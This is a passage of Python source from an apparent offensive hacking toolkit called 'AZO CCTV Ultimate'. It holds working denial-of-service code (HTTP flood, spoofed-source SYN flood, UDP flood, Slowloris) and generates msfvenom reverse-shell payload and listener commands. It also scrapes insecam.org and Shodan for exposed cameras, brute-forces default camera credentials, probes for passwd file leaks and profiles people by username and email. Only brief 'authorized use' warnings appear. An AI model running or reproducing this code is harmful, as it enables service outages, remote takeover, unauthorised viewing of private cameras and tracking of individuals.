                print(payload)
                
        elif choice == "8":
            # Custom payload generator
            print("\nCustom Payload Generator:")
            payload_type = input("Enter payload type (exe/elf/php/jsp/aspx): ").lower()
            encoder = input("Enter encoder (optional, press enter to skip): ") or ""
            iterations = input("Enter encoding iterations (default 1): ") or "1"
            
            cmd_parts = ["msfvenom"]
            
            if payload_type == "exe":
                cmd_parts.append(f"-p windows/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f exe")
            elif payload_type == "elf":
                cmd_parts.append(f"-p linux/x86/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf")
            elif payload_type == "php":
                cmd_parts.append(f"-p php/reverse_php LHOST={lhost} LPORT={lport} -f raw")
            else:
                cmd_parts.append(f"-p generic/shell_reverse_tcp LHOST={lhost} LPORT={lport}")
                
            if encoder:
                cmd_parts.append(f"-e {encoder} -i {iterations}")
                
            cmd_parts.append(f"-o payload.{payload_type}")
            
            print("\nGenerated command:")
            print(" ".join(cmd_parts))
        
        # Save payloads to file
        save = input("\nSave payload to file? (y/n): ").lower()
        if save == 'y':
            filename = input("Enter filename: ") or f"payload_{lhost}_{lport}.txt"
            try:
                with open(f"{self.output_dir}/exports/{filename}", 'w') as f:
                    f.write(f"# AZO CCTV Ultimate - Generated Payload\n")
                    f.write(f"# Target: {lhost}:{lport}\n")
                    f.write(f"# Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
                    f.write("# Use responsibly and only on authorized systems!\n\n")
                print(f"[+] Payload saved to: {self.output_dir}/exports/{filename}")
            except Exception as e:
                print(f"[-] Error saving file: {e}")
        
        self.ask_next_action(self.generate_payload, self.remote_access_menu)

    def setup_listener(self):
        """Setup listener"""
        print("\n--- Setup Listener ---")
        port = input("Enter port to listen on (default 4444): ") or "4444"
        
        print(f"[*] Setting up listener on port {port}")
        print("Execute one of the commands below:")
        print(f"nc -lvp {port}")
        print(f"msfconsole -x 'use multi/handler; set payload generic/shell_reverse_tcp; set lhost 0.0.0.0; set lport {port}; run'")
        
        self.ask_next_action(self.setup_listener, self.remote_access_menu)

    # ========================= DOS ATTACK =========================

    def dos_attack_menu(self):
        """DoS attack menu"""
        menu_intro("DoS Attack")
        
        print("[!] WARNING: Use only against authorized targets!")
        print("[!] DoS attacks may be illegal in many jurisdictions!")
        
        menu = """
        ┌─────────────────────────────────────────────────┐
        │                 DOS ATTACK                      │
        ├─────────────────────────────────────────────────┤
        │ [1] HTTP Flood Attack                           │
        │ [2] TCP SYN Flood                               │
        │ [3] UDP Flood                                   │
        │ [4] Slowloris Attack                            │
        ├─────────────────────────────────────────────────┤
        │ [0] Back to Main Menu                           │
        └─────────────────────────────────────────────────┘
        """
        print(menu)
        
        choice = input(f" root@{self.username}/DoS:~$ ")
        
        if choice == "1":
            self.http_flood_attack()
        elif choice == "2":
            self.tcp_syn_flood()
        elif choice == "3":
            self.udp_flood()
        elif choice == "4":
            self.slowloris_attack()
        elif choice == "0":
            return
        else:
            print("Invalid option!")
            time.sleep(1)
            self.dos_attack_menu()

    def http_flood_attack(self):
        """HTTP Flood Attack - based on L0p4-Toolkit"""
        print("\n--- HTTP Flood Attack ---")
        
        host = input("Enter target URL: ")
        port = input("Enter target port (default 80): ") or "80"
        threads = input("Enter number of threads (default 135): ") or "135"
        
        print(f"\nTarget: {host} | Port: {port} | Threads: {threads}")
        print("Preparing attack...")
        
        # Simplified version of L0p4-Toolkit DoS
        q = Queue()
        w = Queue()
        
        def direct_attack():
            try:
                while True:
                    packet = str(f"GET / HTTP/1.1\nHost: {host}\n\nUser-Agent: {random.choice(self.dos_user_agents)}\n").encode('utf-8')
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    try:
                        s.connect((host, int(port)))
                        if s.sendto(packet, (host, int(port))):
                            s.shutdown(socket.SHUT_WR)
                            print(f"[{time.ctime()}] Packet sent successfully")
                        else:
                            print("Connection closed unexpectedly")
                    except socket.error:
                        print("[!] Connection error! Target may be down.")
                    finally:
                        s.close()
                    time.sleep(0.1)
            except Exception:
                pass

        def bot_attack():
            try:
                while True:
                    bot_url = random.choice(self.dos_bots) + "http://" + host
                    req = urllib.request.Request(bot_url, headers={'User-Agent': random.choice(self.dos_user_agents)})
                    urllib.request.urlopen(req)
                    time.sleep(0.1)
            except:
                time.sleep(0.1)

        def attack_thread():
            while True:
                item = q.get()
                direct_attack()
                q.task_done()

        def bot_thread():
            while True:
                item = w.get()
                bot_attack()
                w.task_done()

        # Test connection
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, int(port)))
            s.settimeout(1)
            s.close()
        except socket.error:
            print("[!] Could not connect to target. Check host/port.")
            self.ask_next_action(self.http_flood_attack, self.dos_attack_menu)
            return

        print("[*] Starting DoS attack...")
        print("[*] Press Ctrl+C to stop")
        
        # Start threads
        try:
            for _ in range(int(threads)):
                t = threading.Thread(target=attack_thread)
                t.daemon = True
                t.start()
                t2 = threading.Thread(target=bot_thread)
                t2.daemon = True
                t2.start()

            # Task queue
            item = 0
            while True:
                if item > 1800:
                    item = 0
                    time.sleep(0.1)
                item += 1
                q.put(item)
                w.put(item)

        except KeyboardInterrupt:
            print("\n[*] Attack interrupted by user")
        
        self.ask_next_action(self.http_flood_attack, self.dos_attack_menu)

    def tcp_syn_flood(self):
        """TCP SYN Flood"""
        print("\n--- TCP SYN Flood ---")
        
        target = input("Enter target IP: ")
        port = input("Enter target port (default 80): ") or "80"
        packets = input("Enter number of packets (default 1000): ") or "1000"
        
        print(f"[*] Starting TCP SYN Flood attack on {target}:{port}")
        print("[*] Press Ctrl+C to stop")
        
        if SCAPY_AVAILABLE:
            try:
                from scapy.all import IP, TCP, send, RandShort
                import random
                
                target_ip = target
                target_port = int(port)
                packet_count = int(packets)
                
                print(f"[+] Sending {packet_count} SYN packets...")
                
                for i in range(packet_count):
                    # Create IP packet with random source IP
                    src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
                    
                    # Create SYN packet
                    ip_packet = IP(src=src_ip, dst=target_ip)
                    tcp_packet = TCP(sport=RandShort(), dport=target_port, flags="S")
                    packet = ip_packet / tcp_packet
                    
                    send(packet, verbose=0)
                    
                    if i % 100 == 0:
                        print(f"[+] Sent {i} packets...")
                    
                    time.sleep(0.001)  # Small delay to avoid overwhelming
                
                print(f"[+] TCP SYN Flood completed. Sent {packet_count} packets.")
                
            except KeyboardInterrupt:
                print("\n[*] Attack interrupted by user")
            except Exception as e:
                print(f"[-] Error during SYN flood: {e}")
        else:
            # Fallback implementation without scapy
            print("[!] Scapy not available. Using basic socket implementation...")
            try:
                import socket
                import random
                
                for i in range(int(packets)):
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(0.1)
                        s.connect_ex((target, int(port)))
                        s.close()
                        
                        if i % 100 == 0:
                            print(f"[+] Sent {i} connection attempts...")
                            
                    except:
                        pass
                    
                print(f"[+] Basic flood completed. Sent {packets} connection attempts.")
                
            except KeyboardInterrupt:
                print("\n[*] Attack interrupted by user")
        
        self.ask_next_action(self.tcp_syn_flood, self.dos_attack_menu)

    def udp_flood(self):
        """UDP Flood"""
        print("\n--- UDP Flood ---")
        
        target = input("Enter target IP: ")
        port = input("Enter target port (default 53): ") or "53"
        packets = input("Enter number of packets (default 1000): ") or "1000"
        payload_size = input("Enter payload size in bytes (default 1024): ") or "1024"
        
        print(f"[*] Starting UDP Flood attack on {target}:{port}")
        print("[*] Press Ctrl+C to stop")
        
        try:
            import socket
            import random
            import string
            
            # Create UDP socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            # Generate random payload
            payload = ''.join(random.choices(string.ascii_letters + string.digits, k=int(payload_size)))
            payload = payload.encode()
            
            target_ip = target
            target_port = int(port)
            packet_count = int(packets)
            
            print(f"[+] Sending {packet_count} UDP packets with {payload_size} bytes payload...")
            
            for i in range(packet_count):
                try:
                    sock.sendto(payload, (target_ip, target_port))
                    
                    if i % 100 == 0:
                        print(f"[+] Sent {i} UDP packets...")
                        
                    time.sleep(0.001)  # Small delay
                    
                except Exception as e:
                    if self.verbose:
                        print(f"[-] Error sending packet {i}: {e}")
                    continue
            
            sock.close()
            print(f"[+] UDP Flood completed. Sent {packet_count} packets.")
            
        except KeyboardInterrupt:
            print("\n[*] Attack interrupted by user")
        except Exception as e:
            print(f"[-] Error during UDP flood: {e}")
        
        self.ask_next_action(self.udp_flood, self.dos_attack_menu)

    def slowloris_attack(self):
        """Slowloris Attack"""
        print("\n--- Slowloris Attack ---")
        
        target = input("Enter target URL (without http://): ")
        port = input("Enter target port (default 80): ") or "80"
        connections = input("Enter number of connections (default 200): ") or "200"
        
        print(f"[*] Starting Slowloris attack on {target}:{port}")
        print("[*] This attack keeps connections open by sending partial HTTP requests")
        print("[*] Press Ctrl+C to stop")
        
        try:
            import socket
            import random
            import time
            import threading
            
            sockets = []
            user_agents = self.user_agents
            
            def create_socket():
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(4)
                    s.connect((target, int(port)))
                    
                    # Send initial HTTP headers
                    s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
                    s.send(f"Host: {target}\r\n".encode())
                    s.send(f"User-Agent: {random.choice(user_agents)}\r\n".encode())
                    s.send("Accept-language: en-US,en,q=0.5\r\n".encode())
                    return s
                except:
                    return None
            
            # Create initial connections
            print(f"[+] Creating {connections} connections...")
            for i in range(int(connections)):
                s = create_socket()
                if s:
                    sockets.append(s)
                    
                if i % 50 == 0:
                    print(f"[+] Created {len(sockets)} connections...")
            
            print(f"[+] Successfully created {len(sockets)} connections")
            print("[*] Keeping connections alive...")
            
            # Keep connections alive
            while True:
                print(f"[*] Maintaining {len(sockets)} connections...")
                
                # Send keep-alive headers
                for s in sockets[:]:
                    try:
                        s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                    except:
                        sockets.remove(s)
                
                # Create new connections to replace closed ones
                for i in range(int(connections) - len(sockets)):
                    s = create_socket()
                    if s:
                        sockets.append(s)
                
                time.sleep(15)  # Wait before sending next keep-alive
                
        except KeyboardInterrupt:
            print("\n[*] Slowloris attack interrupted by user")
            print("[*] Closing connections...")
            for s in sockets:
                try:
                    s.close()
                except:
                    pass
        except Exception as e:
            print(f"[-] Error during Slowloris attack: {e}")
        
        self.ask_next_action(self.slowloris_attack, self.dos_attack_menu)

    # ========================= IP GEOLOCATION =========================

    def ip_geolocation(self):
        """IP Geolocation - based on L0p4-Toolkit"""
        menu_intro("IP Geolocation")
        
        try:
            if REQUESTS_AVAILABLE:
                public_ip = requests.get("https://api.ipify.org").text
                print(f" Your IP address: {public_ip}")
            else:
                print(" Could not get public IP")
            
            print(' Enter "0" to go back')
            target_ip = input(" TARGET IP: ")
            
            if target_ip == "0":
                return
            
            try:
                request_url = 'https://geolocation-db.com/jsonp/' + target_ip
                if REQUESTS_AVAILABLE:
                    response = requests.get(request_url)
                    result = response.content.decode()
                else:
                    response = urllib.request.urlopen(request_url)
                    result = response.read().decode()
                
                result = result.split("(")[1].strip(")")
                result = json.loads(result)
                
                print("\n Geolocation Information:")
                print(f" Country Code: {result.get('country_code', 'N/A')}")
                print(f" Country Name: {result.get('country_name', 'N/A')}")
                print(f" City: {result.get('city', 'N/A')}")
                print(f" Postal Code: {result.get('postal', 'N/A')}")
                print(f" Latitude: {result.get('latitude', 'N/A')}")
                print(f" Longitude: {result.get('longitude', 'N/A')}")
                print(f" IPv4 Address: {result.get('IPv4', 'N/A')}")
                print(f" State: {result.get('state', 'N/A')}")
                
            except Exception as e:
                print(f" Error getting geolocation: {e}")
                
        except Exception as e:
            print(f" Error: {e}")
        
        back = input("\n Go back Y/N: ")
        if back.lower() == "y":
            return
        elif back.lower() == "n":
            sys.exit()

    # ========================= CCTV SCANNER =========================

    def cctv_scanner_menu(self):
        """CCTV Scanner - enhanced version"""
        menu_intro("CCTV Scanner")
        
        menu = """
        ┌─────────────────────────────────────────────────┐
        │                CCTV SCANNER                     │
        ├─────────────────────────────────────────────────┤
        │ [1] Country Scanner                             │
        │ [2] Specific Target Scanner                     │
        │ [3] Shodan Scanner                              │
        │ [4] Vulnerability Test                          │
        │ [5] Credential Test                             │
        ├─────────────────────────────────────────────────┤
        │ [0] Back to Main Menu                           │
        └─────────────────────────────────────────────────┘
        """
        print(menu)
        
        choice = input(f" root@{self.username}/CCTV:~$ ")
        
        if choice == "1":
            self.cctv_country_scan()
        elif choice == "2":
            self.cctv_target_scan()
        elif choice == "3":
            self.cctv_shodan_scan()
        elif choice == "4":
            self.cctv_vulnerability_scan()
        elif choice == "5":
            self.cctv_credential_test()
        elif choice == "0":
            return
        else:
            print("Invalid option!")
            time.sleep(1)
            self.cctv_scanner_menu()

    def cctv_country_scan(self):
        """CCTV Country scan - based on L0p4-Toolkit approach"""
        print("\n--- CCTV Country Scanner ---")
        print("[*] Initializing access to unsecured CCTV feeds...")
        
        try:
            url = "http://www.insecam.org/en/jsoncountries/"
            headers = self.get_random_headers()
            
            print("[+] Retrieving country codes...")
            resp = self.make_request(url, headers=headers)
            
            if resp:
                try:
                    data = json.loads(resp['content'])
                    countries = data.get('countries', {})
                except:
                    print("[!] Warning: Could not parse JSON. Legacy mode...")
                    countries = {}
                
                if countries:
                    print("\n=== Available Country Codes ===")
                    for key, value in countries.items():
                        print(f'Code: ({key}) - {value["country"]} ({value["count"]} cameras)')
                    print("\n[0] Back to Menu")
                else:
                    print("[!] Could not load country list. Enter code manually.")
                
                country = input("\nEnter country code (ex: JP, RU, US, BR): ").strip().upper()
                
                if country == "0":
                    return
                
                print(f"[+] Scanning feeds in region: {country}...")
                res = self.make_request(f"http://www.insecam.org/en/bycountry/{country}", headers=headers)
                
                if res:
                    last_page = re.findall(r'pagenavigator\("\?page=", (\d+)', res['content'])
                    last_page = int(last_page[0]) if last_page else 1
                    
                    os.makedirs("cams", exist_ok=True)
                    filename = f'cams/{country}.txt'
                    
                    with open(filename, 'w') as f:
                        for page in range(last_page):
                            page_res = self.make_request(
                                f"http://www.insecam.org/en/bycountry/{country}/?page={page}",
                                headers=headers
                            )
                            if page_res:
                                find_ip = re.findall(r"http://\d+\.\d+\.\d+\.\d+:\d+", page_res['content'])
                                for ip in find_ip:
                                    print(f"[+] Camera found: {ip}")
                                    f.write(f'{ip}\n')
                                    time.sleep(0.05)
                    
                    print(f"\n[+] Feeds saved to: {filename}")
                else:
                    print("[-] Failed to access country data")
            else:
                print("[-] Failed to connect to insecam.org")
                
        except Exception as e:
            print(f"[!] Error during execution: {e}")
        
        self.ask_next_action(self.cctv_country_scan, self.cctv_scanner_menu)

    def cctv_target_scan(self):
        """CCTV Target specific scan"""
        print("\n--- Specific Target Scanner ---")
        target = input("Enter target IP or URL: ").strip()
        
        if not target:
            print("Invalid target!")
            return
        
        print(f"[*] Scanning target: {target}")
        
        # Test basic connectivity
        try:
            resp = self.make_request(f"http://{target}")
            if resp:
                print(f"[+] Target responds - Status: {resp['status']}")
                
                # Check for common CCTV paths
                cctv_paths = [
                    "/", "/live", "/video", "/stream", "/cam", "/camera",
                    "/axis-cgi/mjpg/video.cgi", "/cgi-bin/viewer/video.jpg",
                    "/video.cgi", "/video.mjpeg", "/videostream.cgi"
                ]
                
                for path in cctv_paths:
                    test_url = f"http://{target}{path}"
                    test_resp = self.make_request(test_url)
                    if test_resp and test_resp['status'] == 200:
                        print(f"[+] Path found: {path}")
            else:
                print("[-] Target does not respond")
                
        except Exception as e:
            print(f"Error during scan: {e}")
        
        self.ask_next_action(self.cctv_target_scan, self.cctv_scanner_menu)

    def cctv_shodan_scan(self):
        """CCTV Shodan scan"""
        print("\n--- Shodan Scanner ---")
        
        if not SHODAN_AVAILABLE:
            print("[-] Shodan not available. Install with: pip install shodan")
            self.ask_next_action(self.cctv_shodan_scan, self.cctv_scanner_menu)
            return
        
        api_key = input("Enter your Shodan API key: ")
        
        if not api_key:
            print("[-] API key required to use Shodan")
            self.ask_next_action(self.cctv_shodan_scan, self.cctv_scanner_menu)
            return
        
        try:
            import shodan
            api = shodan.Shodan(api_key)
            
            # Test API key
            try:
                info = api.info()
                print(f"[+] API key valid. Query credits: {info['query_credits']}")
            except shodan.APIError as e:
                print(f"[-] Invalid API key: {e}")
                self.ask_next_action(self.cctv_shodan_scan, self.cctv_scanner_menu)
                return
            
            search_menu = """
            [1] Search for IP cameras
            [2] Search for webcams
            [3] Search for RTSP streams
            [4] Search for specific device
            [5] Search by country
            [6] Custom Shodan query
            [0] Back
            """
            print(search_menu)
            
            choice = input("root@{}/Shodan:~$ ".format(self.username))
            
            if choice == "0":
                return
            
            # Predefined queries
            queries = {
                "1": "device:camera",
                "2": "webcam",
                "3": "port:554 rtsp",
                "4": "",  # Will be filled by user input
                "5": "",  # Will be filled with country
                "6": ""   # Custom query
            }
            
            if choice == "4":
                device = input("Enter device type to search for: ")
                query = device
            elif choice == "5":
                country = input("Enter country code (ex: US, BR, JP): ")
                query = f"country:{country} camera"
            elif choice == "6":
                query = input("Enter custom Shodan query: ")
            else:
                query = queries.get(choice, "camera")
            
            limit = input("Enter number of results (default 100): ") or "100"
            
            print(f"[*] Searching Shodan for: {query}")
            print(f"[*] Limit: {limit} results")
            
            try:
                results = api.search(query, limit=int(limit))
                
                print(f"\n[+] Found {results['total']} results (showing {len(results['matches'])})")
                
                # Save results to file
                filename = f"shodan_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                filepath = f"{self.output_dir}/reports/{filename}"
                
                with open(filepath, 'w') as f:
                    f.write(f"Shodan Scan Results\\n")
                    f.write(f"Query: {query}\\n")
                    f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\\n")
                    f.write(f"Total Results: {results['total']}\\n")
                    f.write("="*50 + "\\n\\n")
                    
                    for i, result in enumerate(results['matches'], 1):
                        ip = result['ip_str']
                        port = result.get('port', 'N/A')
                        org = result.get('org', 'Unknown')
                        country = result.get('location', {}).get('country_name', 'Unknown')
                        city = result.get('location', {}).get('city', 'Unknown')
                        hostnames = ', '.join(result.get('hostnames', ['No hostname']))
                        
                        print(f"\\n[{i}] IP: {ip}:{port}")
                        print(f"    Location: {city}, {country}")
                        print(f"    Organization: {org}")
                        print(f"    Hostnames: {hostnames}")
                        
                        # Check for web interface
                        if port in [80, 8080, 443, 8443]:
                            protocol = "https" if port in [443, 8443] else "http"
                            print(f"    Web Interface: {protocol}://{ip}:{port}")
                        
                        # Save to file
                        f.write(f"[{i}] {ip}:{port}\\n")
                        f.write(f"Location: {city}, {country}\\n")
                        f.write(f"Organization: {org}\\n")
                        f.write(f"Hostnames: {hostnames}\\n")
                        
                        if 'data' in result:
                            banner = result['data'][:200] + "..." if len(result['data']) > 200 else result['data']
                            print(f"    Banner: {banner}")
                            f.write(f"Banner: {banner}\\n")
                        
                        f.write("\\n" + "-"*30 + "\\n\\n")
                        
                        # Add to results for statistics
                        self.results.append(f"{ip}:{port}")
                
                print(f"\\n[+] Results saved to: {filepath}")
                
                # Ask if user wants to test found IPs
                test_ips = input("\\nTest found IPs for CCTV access? (y/n): ").lower()
                if test_ips == 'y':
                    print("\\n[*] Testing IPs for CCTV access...")
                    
                    for result in results['matches'][:10]:  # Test first 10 IPs
                        ip = result['ip_str']
                        port = result.get('port', 80)
                        
                        # Test common CCTV paths
                        test_paths = ["/", "/video", "/cam", "/live", "/stream"]
                        
                        for path in test_paths:
                            try:
                                url = f"http://{ip}:{port}{path}"
                                resp = self.make_request(url, timeout=3)
                                
                                if resp and resp['status'] == 200:
                                    print(f"[+] Active CCTV found: {url}")
                                    break
                                    
                            except Exception:
                                continue
                
            except shodan.APIError as e:
                print(f"[-] Shodan API error: {e}")
            except Exception as e:
                print(f"[-] Error during Shodan search: {e}")
                
        except ImportError:
            print("[-] Shodan module not found. Install with: pip install shodan")
        except Exception as e:
            print(f"[-] Error: {e}")
        
        self.ask_next_action(self.cctv_shodan_scan, self.cctv_scanner_menu)

    def cctv_vulnerability_scan(self):
        """CCTV Vulnerability scan"""
        print("\n--- Vulnerability Test ---")
        target = input("Enter target IP or URL: ").strip()
        
        if not target:
            print("Invalid target!")
            return
        
        print(f"[*] Testing vulnerabilities on: {target}")
        
        for endpoint in self.vuln_endpoints[:10]:  # Test first 10 endpoints
            test_url = f"http://{target}{endpoint}"
            resp = self.make_request(test_url)
            if resp and resp['status'] == 200:
                print(f"[+] Vulnerable endpoint found: {endpoint}")
                if "passwd" in resp['content'] or "root:" in resp['content']:
                    print(f"[!] CRITICAL: Possible passwd file leak!")
        
        self.ask_next_action(self.cctv_vulnerability_scan, self.cctv_scanner_menu)

    def cctv_credential_test(self):
        """CCTV Credential testing"""
        print("\n--- Credential Test ---")
        target = input("Enter target IP or URL: ").strip()
        
        if not target:
            print("Invalid target!")
            return
        
        print(f"[*] Testing credentials on: {target}")
        
        for username, password in self.credentials[:10]:  # Test first 10 credentials
            try:
                resp = self.make_request(f"http://{target}", auth=(username, password))
                if resp and resp['status'] == 200:
                    print(f"[+] Credentials found: {username}:{password}")
                    break
                time.sleep(0.5)
            except Exception:
                continue
        
        self.ask_next_action(self.cctv_credential_test, self.cctv_scanner_menu)

    # ========================= OSINT TOOLS =========================

    def osint_menu(self):
        """OSINT Tools menu"""
        menu_intro("OSINT Tools")
        
        menu = """
        ┌─────────────────────────────────────────────────┐
        │                 OSINT TOOLS                     │
        ├─────────────────────────────────────────────────┤
        │ [1] Social Media OSINT                          │
        │ [2] Username Lookup                             │
        │ [3] Email Investigation                         │
        │ [4] Advanced OSINT Framework                    │
        │ [5] Intelligence Framework                      │
        │ [6] Reconnaissance Framework                    │
        │ [7] Email & Social Analysis                     │
        │ [8] Image & Face Analysis                       │
        ├─────────────────────────────────────────────────┤
        │ [0] Back to Main Menu                           │
        └─────────────────────────────────────────────────┘
        """

        print(menu)
        
        choice = input(f" root@{self.username}/OSINT:~$ ")
        
        if choice == "1":
            self.social_media_osint()
        elif choice == "2":
            self.username_lookup()
        elif choice == "3":
            self.email_lookup()
        elif choice == "4":
            self.osint_framework()
        elif choice == "5":
            self.advanced_intel_framework()
        elif choice == "6":
            self.reconnaissance_framework()
        elif choice == "7":
            self.social_lookup()
        elif choice == "8":
            self.image_analysis()
        elif choice == "0":
            return
        else:
            print("Invalid option!")
            time.sleep(1)
            self.osint_menu()

    def social_media_osint(self):
        """Social Media OSINT"""
        print("\n--- Social Media OSINT ---")
        
        username = input("Enter username to investigate: ")
        
        if not username:
            print("[-] Username required")
            self.ask_next_action(self.social_media_osint, self.osint_menu)
            return
        
        print(f"[*] Investigating username: {username}")
        print("[*] Checking multiple platforms...")
        
        # Extended platform list
        platforms = {
            "GitHub": f"https://github.com/{username}",
            "Twitter": f"https://twitter.com/{username}",
            "Instagram": f"https://instagram.com/{username}",
            "Reddit": f"https://reddit.com/user/{username}",
            "YouTube": f"https://youtube.com/user/{username}",
            "Facebook": f"https://facebook.com/{username}",
            "LinkedIn": f"https://linkedin.com/in/{username}",
            "TikTok": f"https://tiktok.com/@{username}",
            "Pinterest": f"https://pinterest.com/{username}",
            "Tumblr": f"https://{username}.tumblr.com",
            "Snapchat": f"https://snapchat.com/add/{username}",
            "Discord": f"https://discord.com/users/{username}",
            "Telegram": f"https://t.me/{username}",
            "Medium": f"https://medium.com/@{username}",
            "DeviantArt": f"https://{username}.deviantart.com",
            "Twitch": f"https://twitch.tv/{username}",
            "Steam": f"https://steamcommunity.com/id/{username}",
            "GitLab": f"https://gitlab.com/{username}",
            "Dribbble": f"https://dribbble.com/{username}",
            "Behance": f"https://behance.net/{username}",
            "Flickr": f"https://flickr.com/people/{username}",
            "SoundCloud": f"https://soundcloud.com/{username}",
            "Spotify": f"https://open.spotify.com/user/{username}",
            "Patreon": f"https://patreon.com/{username}",
            "OnlyFans": f"https://onlyfans.com/{username}",
            "Keybase": f"https://keybase.io/{username}",
            "VK": f"https://vk.com/{username}",
            "BitBucket": f"https://bitbucket.org/{username}",
            "About.me": f"https://about.me/{username}",
            "Gravatar": f"https://gravatar.com/{username}"
        }
        
        found_profiles = []
        not_found = []
        
        # Create results file
        filename = f"osint_social_{username}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        filepath = f"{self.output_dir}/reports/{filename}"
        
        with open(filepath, 'w') as f:
            f.write(f"Social Media OSINT Report\\n")
            f.write(f"Username: {username}\\n")
            f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\\n")
            f.write("="*50 + "\\n\\n")
            
            print(f"\\n[*] Checking {len(platforms)} platforms...")
            
            for i, (platform, url) in enumerate(platforms.items(), 1):
                try:
                    print(f"[{i}/{len(platforms)}] Checking {platform}...", end=" ")
                    
                    resp = self.make_request(url, timeout=5)
                    
                    if resp:
                        status = resp['status']
                        content = resp['content'].lower()
                        
                        # Platform-specific checks
                        if platform == "GitHub":
                            if status == 200 and "not found" not in content:
                                found = True
                            else:
                                found = False
                        elif platform == "Twitter":
                            if status == 200 and "this account doesn't exist" not in content:
                                found = True
                            else:
                                found = False
                        elif platform == "Instagram":
                            if status == 200 and "sorry, this page isn't available" not in content:
                                found = True
                            else:
                                found = False
                        elif platform == "Reddit":
                            if status == 200 and "page not found" not in content:
                                found = True
                            else:
                                found = False
                        else:
                            # Generic check
                            if status == 200:
                                found = True
                            else:
                                found = False
                        
                        if found:
                            print("FOUND")
                            found_profiles.append((platform, url))
                            f.write(f"[+] {platform}: {url}\\n")
                        else:
                            print("NOT FOUND")
                            not_found.append(platform)
                    else:
                        print("ERROR")
                        not_found.append(platform)
                    
                    time.sleep(0.5)  # Rate limiting
                    
                except Exception as e:
                    print(f"ERROR ({e})")
                    not_found.append(platform)
                    continue
            
            # Summary
            f.write(f"\\n\\nSUMMARY:\\n")
            f.write(f"Found: {len(found_profiles)} profiles\\n")
            f.write(f"Not found: {len(not_found)} profiles\\n")
            
            if found_profiles:
                f.write("\\nFOUND PROFILES:\\n")
                for platform, url in found_profiles:
                    f.write(f"- {platform}: {url}\\n")
        
        print(f"\\n[+] OSINT Summary:")
        print(f"    Found profiles: {len(found_profiles)}")
        print(f"    Not found: {len(not_found)}")
        print(f"    Report saved: {filepath}")
        
        if found_profiles:
            print("\\n[+] Found profiles:")
            for platform, url in found_profiles:
                print(f"    {platform}: {url}")
        
        self.ask_next_action(self.social_media_osint, self.osint_menu)

    def email_lookup(self):
        """Email lookup and verification"""
        print("\n--- Email Lookup ---")

        email = input("Enter email address to investigate: ")
        if not email or "@" not in email:
            print("[-] Valid email address required")
            self.ask_next_action(self.email_lookup, self.osint_menu)
            return

        # Create report file
        filename = f"osint_email_{email.replace('@', '_at_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        filepath = f"{self.output_dir}/reports/{filename}"

        with open(filepath, 'w') as f:
            f.write(f"Email Investigation Report\n")
            f.write(f"Email: {email}\n")
            f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("="*50 + "\n\n")

            # 1. Email validation
            print("[*] Validating email format...")
            import re
            email_regex = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$'
            if re.match(email_regex, email):
                print("[+] Email format is valid")
                f.write("[+] Email format: VALID\n")
            else:
                print("[-] Email format is invalid")
                f.write("[-] Email format: INVALID\n")

            # 2. Domain analysis
            domain = email.split("@")[1]
            print(f"[*] Analyzing domain: {domain}")
            f.write(f"\nDomain: {domain}\n")

            # Check if domain exists
            try:
                import socket
                socket.gethostbyname(domain)
                print("[+] Domain exists")
                f.write("[+] Domain status: EXISTS\n")
            except socket.gaierror:
                print("[-] Domain does not exist")
                f.write("[-] Domain status: NOT EXISTS\n")

            # 3. Check common social platforms with email
            print("[*] Checking social media registrations...")

            social_checks = {
                "Gravatar": f"https://gravatar.com/{email}",
                "GitHub": "https://github.com/login",  # Would need different approach
                "Google": "https://accounts.google.com",  # Would need different approach
            }

            # Simple Gravatar check
            try:
                import hashlib
                email_hash = hashlib.md5(email.lower().encode()).hexdigest()
                gravatar_url = f"https://gravatar.com/avatar/{email_hash}?d=404"

                resp = self.make_request(gravatar_url)
                if resp and resp['status'] == 200:
                    print("[+] Gravatar profile found")
                    f.write(f"[+] Gravatar: https://gravatar.com/{email_hash}\\n")
                else:
                    print("[-] No Gravatar profile")
                    f.write("[-] Gravatar: NOT FOUND\\n")
            except Exception as e:
                print(f"[-] Gravatar check failed: {e}")

            # 4. Data breach check (simplified)
            print("[*] Checking for known data breaches...")
            f.write("\nData Breach Check:\n")
            f.write("Note: For comprehensive breach checking, use services like:\n")
            f.write("- HaveIBeenPwned.com\n")
            f.write("- DeHashed.com\n")
            f.write("- LeakCheck.io\n")

            # 5. Email provider information
            print("[*] Analyzing email provider...")

            provider_info = {
                "gmail.com": "Google Gmail",
                "yahoo.com": "Yahoo Mail",
                "outlook.com": "Microsoft Outlook",
                "hotmail.com": "Microsoft Hotmail",
                "protonmail.com": "ProtonMail (Privacy-focused)",
                "tutanota.com": "Tutanota (Privacy-focused)",
                "aol.com": "AOL Mail",
                "icloud.com": "Apple iCloud",
                "mail.com": "Mail.com",
                "yandex.com": "Yandex Mail"
            }

            provider = provider_info.get(domain, "Unknown/Custom")
            print(f"[+] Email provider: {provider}")
            f.write(f"\nEmail Provider: {provider}\n")

            # 6. Check if email appears to be temporary
            temp_domains = [
                "10minutemail.com", "tempmail.org", "guerrillamail.com", 
                "mailinator.com", "throwaway.email", "temp-mail.org"
            ]

            if domain in temp_domains:
                print("[!] Warning: Temporary email provider detected")
                f.write("[!] WARNING: Temporary email provider\n")
            else:
                print("[+] Not a known temporary email provider")
